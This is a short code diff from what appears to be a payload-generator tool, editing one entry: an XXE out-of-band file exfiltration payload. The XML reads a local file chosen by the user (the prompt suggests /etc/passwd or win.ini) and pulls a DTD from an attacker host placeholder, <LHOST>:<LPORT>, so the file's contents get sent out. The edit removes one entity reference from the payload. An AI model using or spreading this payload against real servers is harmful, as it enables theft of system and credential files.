@@ -88,7 +88,7 @@ Load({
 
 Load({
 	title: "XXE (Out of Band File Exfiltration using parameter entities)",
-	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://<PROMPT>\"><!ENTITY % dtd SYSTEM \"http://<LHOST>:<LPORT>/send\">%dtd;%send;%all;]>",
+	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://<PROMPT>\"><!ENTITY % dtd SYSTEM \"http://<LHOST>:<LPORT>/send\">%dtd;%send;]>",
 	callback: function(bro){
 		question("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)");
 		question(ask.http);
